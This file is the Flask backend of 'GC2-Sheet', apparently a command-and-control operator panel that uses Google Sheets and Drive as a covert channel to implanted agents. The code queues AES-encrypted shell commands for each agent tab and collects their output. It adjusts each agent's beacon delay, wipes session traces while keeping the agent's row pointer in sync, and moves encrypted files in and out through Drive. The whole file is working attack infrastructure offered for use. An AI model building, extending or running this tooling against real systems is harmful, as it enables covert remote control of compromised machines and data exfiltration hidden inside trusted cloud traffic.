"""
GC2-Sheet Web UI — Flask Backend v3
Fixes: rename-proof (GID), clear session row sync, per-agent keys,
       timestamp decrypt, Drive file delete, extra edge cases.
"""

import os, json, threading, io, secrets, base64
from flask import Flask, jsonify, request, render_template, Response
from flask_cors import CORS
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request as GoogleAuthRequest
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseDownload, MediaIoBaseUpload
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ─────────────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────────────
SCOPES = [
    "https://www.googleapis.com/auth/spreadsheets",
    "https://www.googleapis.com/auth/drive",
]
BASE_DIR         = os.path.dirname(os.path.abspath(__file__))
CREDENTIALS_FILE = os.path.join(BASE_DIR, "credentials.json")
TOKEN_FILE       = os.path.join(BASE_DIR, "token.json")
CONFIG_FILE      = os.path.join(BASE_DIR, "gc2_config.json")
DOWNLOAD_FOLDER  = os.path.join(BASE_DIR, "downloads")
UPLOAD_FOLDER    = os.path.join(BASE_DIR, "uploads")
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
os.makedirs(UPLOAD_FOLDER,   exist_ok=True)

COL_CMD   = "A"
COL_OUT   = "B"
COL_TS    = "C"
# Col D is the "Delay config (sec)" label (written by agent, we don't touch it)
TICKER_CELL = "E2"
# We store per-agent clear watermark in col F — never read by agent
COL_WATERMARK = "F"

# ─────────────────────────────────────────────────────────────────────────────
# AES-256-GCM
# Wire format (text): base64( 12-byte nonce || ciphertext || 16-byte GCM tag )
# Wire format (bytes): raw( 12-byte nonce || ciphertext || 16-byte GCM tag )
# ─────────────────────────────────────────────────────────────────────────────

def _parse_key(hex_str: str) -> bytes | None:
    h = (hex_str or "").strip().lower()
    if len(h) != 64:
        return None
    try:
        return bytes.fromhex(h)
    except ValueError:
        return None


def aes_encrypt(plaintext: str, key: bytes) -> str:
    nonce  = secrets.token_bytes(12)
    ct     = AESGCM(key).encrypt(nonce, plaintext.encode(), None)
    return base64.b64encode(nonce + ct).decode()


def aes_decrypt(b64: str, key: bytes) -> str | None:
    try:
        raw = base64.b64decode(b64)
        pt  = AESGCM(key).decrypt(raw[:12], raw[12:], None)
        return pt.decode()
    except Exception:
        return None


def aes_encrypt_bytes(data: bytes, key: bytes) -> bytes:
    nonce = secrets.token_bytes(12)
    return nonce + AESGCM(key).encrypt(nonce, data, None)


def aes_decrypt_bytes(data: bytes, key: bytes) -> bytes | None:
    try:
        return AESGCM(key).decrypt(data[:12], data[12:], None)
    except Exception:
        return None


def gen_key_hex() -> str:
    return secrets.token_hex(32)

# ─────────────────────────────────────────────────────────────────────────────
# Flask
# ─────────────────────────────────────────────────────────────────────────────
app = Flask(__name__)
CORS(app)

# ─────────────────────────────────────────────────────────────────────────────
# Google Auth (thread-safe singleton)
# ─────────────────────────────────────────────────────────────────────────────
_gcreds      = None
_gcreds_lock = threading.Lock()


def get_creds() -> Credentials:
    global _gcreds
    with _gcreds_lock:
        if _gcreds and _gcreds.valid:
            return _gcreds
        creds = None
        if os.path.exists(TOKEN_FILE):
            creds = Credentials.from_authorized_user_file(TOKEN_FILE, SCOPES)
        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(GoogleAuthRequest())
            else:
                if not os.path.exists(CREDENTIALS_FILE):
                    raise FileNotFoundError("credentials.json not found")
                flow  = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
                creds = flow.run_local_server(port=0)
            with open(TOKEN_FILE, "w") as fh:
                fh.write(creds.to_json())
        _gcreds = creds
        return creds


def svc_sheets():
    return build("sheets", "v4", credentials=get_creds(), cache_discovery=False)


def svc_drive():
    return build("drive",  "v3", credentials=get_creds(), cache_discovery=False)

# ─────────────────────────────────────────────────────────────────────────────
# Config  (persisted to gc2_config.json)
#
# Schema:
# {
#   "sheet_id": "...",
#   "drive_id":  "...",
#   "aes_key_hex": "...",          # global fallback key
#   "agent_keys": {                # per-agent override keys, keyed by str(gid)
#     "123456": "aabbcc..."
#   }
# }
# ─────────────────────────────────────────────────────────────────────────────

def load_cfg() -> dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE) as fh:
            return json.load(fh)
    return {"sheet_id": "", "drive_id": "", "aes_key_hex": "", "agent_keys": {}}


def save_cfg(cfg: dict):
    cfg.setdefault("agent_keys", {})
    with open(CONFIG_FILE, "w") as fh:
        json.dump(cfg, fh, indent=2)


def get_key_for_agent(cfg: dict, gid: int) -> bytes | None:
    """Per-agent key takes priority; falls back to global key."""
    per = cfg.get("agent_keys", {}).get(str(gid), "")
    if per:
        k = _parse_key(per)
        if k:
            return k
    return _parse_key(cfg.get("aes_key_hex", ""))

# ─────────────────────────────────────────────────────────────────────────────
# Sheets helpers
# ─────────────────────────────────────────────────────────────────────────────

def list_agents(sheet_id: str) -> list:
    meta = svc_sheets().spreadsheets().get(spreadsheetId=sheet_id).execute()
    return [
        {
            "id":    s["properties"]["sheetId"],
            "name":  s["properties"]["title"],
            "index": s["properties"]["index"],
        }
        for s in meta.get("sheets", [])
    ]


def resolve_name(sheet_id: str, gid: int) -> str:
    """Return current tab title by stable numeric GID (rename-proof)."""
    meta = svc_sheets().spreadsheets().get(spreadsheetId=sheet_id).execute()
    for s in meta.get("sheets", []):
        if s["properties"]["sheetId"] == gid:
            return s["properties"]["title"]
    raise ValueError(f"No sheet tab with GID {gid}")


def get_history(sheet_id: str, tab: str, key: bytes | None) -> tuple[list, int]:
    svc  = svc_sheets()
    resp = svc.spreadsheets().values().batchGet(
        spreadsheetId=sheet_id,
        ranges=[f"'{tab}'!A:C", f"'{tab}'!{TICKER_CELL}", f"'{tab}'!{COL_WATERMARK}:{COL_WATERMARK}"],
    ).execute()
    vr         = resp.get("valueRanges", [])
    rows_raw   = vr[0].get("values", []) if len(vr) > 0 else []
    ticker_raw = vr[1].get("values", [[10]])[0][0] if len(vr) > 1 else 10
    # Col F: watermark rows are sentinel (agent cleared). We read them to know
    # which rows are padding so we don't display them.
    wm_vals    = vr[2].get("values", []) if len(vr) > 2 else []
    watermarks = {i for i, w in enumerate(wm_vals) if w and w[0] == "__PAD__"}

    history = []
    for i, row in enumerate(rows_raw):
        if i in watermarks:
            continue          # padding row — skip display
        raw_cmd = row[0] if len(row) > 0 else ""
        raw_out = row[1] if len(row) > 1 else ""
        raw_ts  = row[2] if len(row) > 2 else ""
        if not raw_cmd or raw_cmd.strip() == "":
            continue

        cmd = raw_cmd; out = raw_out; ts = raw_ts
        encrypted_cmd = False

        if key:
            dec = aes_decrypt(raw_cmd, key)
            if dec is not None:
                cmd = dec; encrypted_cmd = True
            if raw_out:
                dec_o = aes_decrypt(raw_out, key)
                if dec_o is not None:
                    out = dec_o
            if raw_ts:
                dec_t = aes_decrypt(raw_ts, key)
                if dec_t is not None:
                    ts = dec_t

        history.append({
            "row":           i + 1,
            "command":       cmd,
            "output":        out,
            "timestamp":     ts,
            "pending":       bool(raw_cmd and not raw_out),
            "encrypted_cmd": encrypted_cmd,
        })

    try:
        ticker = int(ticker_raw)
    except Exception:
        ticker = 10
    return history, ticker


def next_empty_row(sheet_id: str, tab: str) -> int:
    """
    Count rows that have any content in col A (including padding sentinels).
    +1 gives the next row for new commands — matching agent's nextElementIndex.
    """
    resp = svc_sheets().spreadsheets().values().get(
        spreadsheetId=sheet_id,
        range=f"'{tab}'!A:A",
    ).execute()
    return len(resp.get("values", [])) + 1


def send_cmd(sheet_id: str, tab: str, command: str, row: int, key: bytes | None):
    payload = aes_encrypt(command, key) if key else command
    svc_sheets().spreadsheets().values().update(
        spreadsheetId=sheet_id,
        range=f"'{tab}'!{COL_CMD}{row}",
        valueInputOption="RAW",
        body={"values": [[payload]]},
    ).execute()


def set_ticker(sheet_id: str, tab: str, seconds: int):
    svc_sheets().spreadsheets().values().update(
        spreadsheetId=sheet_id,
        range=f"'{tab}'!{TICKER_CELL}",
        valueInputOption="RAW",
        body={"values": [[str(seconds)]]},
    ).execute()


def clear_session(sheet_id: str, tab: str):
    """
    Wipe visible data from A:C while keeping agent's row pointer in sync.

    Problem: agent uses nextElementIndex (starts at RowId=1, increments after
    each executed command). After clear we MUST NOT change how many rows exist
    in col A, or the agent will re-read old/empty rows or skip ahead.

    Solution:
      1. Count N = current number of rows with content in col A.
      2. Clear A:C entirely.
      3. Write N sentinel values back to A1:A{N} — a single space keeps the
         row counted by the API but is treated as empty by the agent's
         `if command == ""` check.  BUT we also mark col F with "__PAD__"
         so the UI knows to skip those rows when rendering history.
      4. Result: next_empty_row() still returns N+1, matching what the agent
         will look at next. UI shows a clean terminal.
    """
    svc = svc_sheets()

    # 1. How many rows are occupied in col A?
    col_a = svc.spreadsheets().values().get(
        spreadsheetId=sheet_id, range=f"'{tab}'!A:A",
    ).execute()
    n = len(col_a.get("values", []))

    if n == 0:
        return  # nothing to clear

    # 2. Clear A:C
    svc.spreadsheets().values().clear(
        spreadsheetId=sheet_id, range=f"'{tab}'!A:C", body={},
    ).execute()
    # Also clear F (old watermarks)
    svc.spreadsheets().values().clear(
        spreadsheetId=sheet_id, range=f"'{tab}'!F:F", body={},
    ).execute()

    # 3. Write padding sentinels: col A gets single space (keeps row count),
    #    col F gets __PAD__ marker (tells UI to skip row)
    pad_a = [[" "] for _ in range(n)]
    pad_f = [["__PAD__"] for _ in range(n)]

    svc.spreadsheets().values().update(
        spreadsheetId=sheet_id,
        range=f"'{tab}'!A1:A{n}",
        valueInputOption="RAW",
        body={"values": pad_a},
    ).execute()
    svc.spreadsheets().values().update(
        spreadsheetId=sheet_id,
        range=f"'{tab}'!F1:F{n}",
        valueInputOption="RAW",
        body={"values": pad_f},
    ).execute()


def delete_tab(sheet_id: str, gid: int):
    svc_sheets().spreadsheets().batchUpdate(
        spreadsheetId=sheet_id,
        body={"requests": [{"deleteSheet": {"sheetId": gid}}]},
    ).execute()

# ─────────────────────────────────────────────────────────────────────────────
# Drive helpers
# ─────────────────────────────────────────────────────────────────────────────

def drive_list(folder_id: str) -> list:
    resp = svc_drive().files().list(
        q=f"'{folder_id}' in parents and trashed=false",
        fields="files(id,name,size,mimeType,modifiedTime)",
        supportsAllDrives=True,
        includeItemsFromAllDrives=True,
        orderBy="modifiedTime desc",
    ).execute()
    return resp.get("files", [])


def drive_download(file_id: str) -> bytes:
    req = svc_drive().files().get_media(fileId=file_id, supportsAllDrives=True)
    buf = io.BytesIO()
    dl  = MediaIoBaseDownload(buf, req)
    done = False
    while not done:
        _, done = dl.next_chunk()
    return buf.getvalue()


def drive_upload(folder_id: str, data: bytes, filename: str) -> str:
    media = MediaIoBaseUpload(io.BytesIO(data), mimetype="application/octet-stream", resumable=False)
    f = svc_drive().files().create(
        body={"name": filename, "parents": [folder_id]},
        media_body=media,
        fields="id",
        supportsAllDrives=True,
    ).execute()
    return f["id"]


def drive_delete(file_id: str):
    svc_drive().files().delete(fileId=file_id, supportsAllDrives=True).execute()

# ─────────────────────────────────────────────────────────────────────────────
# Routes — misc
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/auth/status")
def auth_status():
    try:
        get_creds()
        return jsonify({"authenticated": True})
    except Exception as e:
        return jsonify({"authenticated": False, "error": str(e)})


@app.route("/api/auth/login")
def auth_login():
    try:
        get_creds()
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

# ─────────────────────────────────────────────────────────────────────────────
# Routes — config
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/config", methods=["GET"])
def cfg_get():
    cfg = load_cfg()
    # Mask global key
    masked_global = ""
    if cfg.get("aes_key_hex"):
        k = cfg["aes_key_hex"]
        masked_global = k[:8] + "…" + k[-4:]
    # Mask per-agent keys
    masked_agents = {}
    for gid, k in cfg.get("agent_keys", {}).items():
        masked_agents[gid] = (k[:8] + "…" + k[-4:]) if k else ""
    return jsonify({
        "sheet_id":        cfg.get("sheet_id", ""),
        "drive_id":        cfg.get("drive_id", ""),
        "aes_key_hex":     masked_global,
        "aes_key_set":     bool(cfg.get("aes_key_hex")),
        "agent_keys":      masked_agents,
    })


@app.route("/api/config", methods=["POST"])
def cfg_save():
    data = request.json or {}
    cfg  = load_cfg()
    for k in ("sheet_id", "drive_id"):
        if k in data and data[k] is not None:
            cfg[k] = data[k]
    if data.get("aes_key_hex") and "…" not in data["aes_key_hex"]:
        cfg["aes_key_hex"] = data["aes_key_hex"].strip().lower()
    save_cfg(cfg)
    return jsonify({"ok": True})


@app.route("/api/config/generate-key", methods=["POST"])
def cfg_gen_key():
    """Generate a new global AES-256 key."""
    cfg = load_cfg()
    k   = gen_key_hex()
    cfg["aes_key_hex"] = k
    save_cfg(cfg)
    return jsonify({"ok": True, "aes_key_hex": k})


@app.route("/api/config/agent-key/<int:gid>", methods=["GET"])
def cfg_get_agent_key(gid: int):
    cfg = load_cfg()
    raw = cfg.get("agent_keys", {}).get(str(gid), "")
    if raw:
        return jsonify({"key_set": True, "key_hex": raw[:8] + "…" + raw[-4:]})
    return jsonify({"key_set": False, "key_hex": ""})


@app.route("/api/config/agent-key/<int:gid>", methods=["POST"])
def cfg_set_agent_key(gid: int):
    """Set or clear a per-agent encryption key."""
    data = request.json or {}
    cfg  = load_cfg()
    cfg.setdefault("agent_keys", {})
    raw  = (data.get("key_hex") or "").strip().lower()
    if raw and "…" not in raw:
        if len(raw) != 64:
            return jsonify({"error": "Key must be 64 hex chars (256 bits)"}), 400
        cfg["agent_keys"][str(gid)] = raw
    else:
        # empty → remove per-agent key (fall back to global)
        cfg["agent_keys"].pop(str(gid), None)
    save_cfg(cfg)
    return jsonify({"ok": True})


@app.route("/api/config/agent-key/<int:gid>/generate", methods=["POST"])
def cfg_gen_agent_key(gid: int):
    cfg = load_cfg()
    cfg.setdefault("agent_keys", {})
    k   = gen_key_hex()
    cfg["agent_keys"][str(gid)] = k
    save_cfg(cfg)
    return jsonify({"ok": True, "key_hex": k})

# ─────────────────────────────────────────────────────────────────────────────
# Routes — agents (all keyed by numeric GID — rename-proof)
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/agents")
def agents_list():
    cfg = load_cfg()
    if not cfg.get("sheet_id"):
        return jsonify({"error": "Sheet ID not configured"}), 400
    try:
        return jsonify(list_agents(cfg["sheet_id"]))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/agents/<int:gid>/history")
def agents_history(gid: int):
    cfg = load_cfg()
    key = get_key_for_agent(cfg, gid)
    try:
        tab      = resolve_name(cfg["sheet_id"], gid)
        hist, tk = get_history(cfg["sheet_id"], tab, key)
        return jsonify({
            "history":    hist,
            "ticker":     tk,
            "encryption": key is not None,
            "name":       tab,
            "gid":        gid,
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/agents/<int:gid>/command", methods=["POST"])
def agents_command(gid: int):
    cfg  = load_cfg()
    key  = get_key_for_agent(cfg, gid)
    cmd  = (request.json or {}).get("command", "").strip()
    if not cmd:
        return jsonify({"error": "Empty command"}), 400
    try:
        tab = resolve_name(cfg["sheet_id"], gid)
        row = next_empty_row(cfg["sheet_id"], tab)
        send_cmd(cfg["sheet_id"], tab, cmd, row, key)
        return jsonify({"ok": True, "row": row, "encrypted": key is not None})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/agents/<int:gid>/ticker", methods=["POST"])
def agents_ticker(gid: int):
    cfg  = load_cfg()
    secs = int((request.json or {}).get("seconds", 10))
    try:
        tab = resolve_name(cfg["sheet_id"], gid)
        set_ticker(cfg["sheet_id"], tab, secs)
        return jsonify({"ok": True, "seconds": secs})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/agents/<int:gid>/clear", methods=["POST"])
def agents_clear(gid: int):
    cfg = load_cfg()
    try:
        tab = resolve_name(cfg["sheet_id"], gid)
        clear_session(cfg["sheet_id"], tab)
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/agents/<int:gid>/delete", methods=["POST"])
def agents_delete(gid: int):
    cfg = load_cfg()
    try:
        # Also clean up per-agent key
        cfg.get("agent_keys", {}).pop(str(gid), None)
        save_cfg(cfg)
        delete_tab(cfg["sheet_id"], gid)
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────────────────────────────────────────────────────────────────────
# Routes — Drive
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/drive/files")
def drive_files():
    cfg = load_cfg()
    if not cfg.get("drive_id"):
        return jsonify({"error": "Drive ID not configured"}), 400
    try:
        return jsonify(drive_list(cfg["drive_id"]))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/drive/download/<file_id>")
def drive_dl(file_id: str):
    cfg      = load_cfg()
    filename = request.args.get("name", file_id)
    gid_str  = request.args.get("gid", "")

    if not gid_str.isdigit():
        return jsonify({"error": "No agent selected — select an agent before downloading"}), 400

    key = get_key_for_agent(cfg, int(gid_str))

    try:
        raw = drive_download(file_id)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    out = raw
    decrypted = False
    if key:
        dec = aes_decrypt_bytes(raw, key)
        if dec is not None:
            out = dec
            decrypted = True

    return Response(
        out,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Content-Type":        "application/octet-stream",
            "X-Decrypted":         str(decrypted).lower(),
        },
    )


@app.route("/api/drive/upload", methods=["POST"])
def drive_ul():
    cfg = load_cfg()
    if not cfg.get("drive_id"):
        return jsonify({"error": "Drive ID not configured"}), 400
    if "file" not in request.files:
        return jsonify({"error": "No file"}), 400

    gid_str = request.form.get("gid", "")
    if not gid_str.isdigit():
        return jsonify({"error": "No agent selected — select an agent before uploading"}), 400

    key = get_key_for_agent(cfg, int(gid_str))
    f   = request.files["file"]
    raw = f.read()
    if key:
        data = aes_encrypt_bytes(raw, key)
        name = f.filename + ".enc"
    else:
        data = raw
        name = f.filename
    try:
        fid = drive_upload(cfg["drive_id"], data, name)
        return jsonify({"ok": True, "file_id": fid, "name": name, "encrypted": key is not None})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/drive/delete/<file_id>", methods=["POST"])
def drive_del(file_id: str):
    try:
        drive_delete(file_id)
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────────────────────────────────────────────────────────────────────
# Run
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n  GC2-Sheet Web UI v3  ·  http://127.0.0.1:5000\n")
    app.run(debug=True, host="127.0.0.1", port=5000)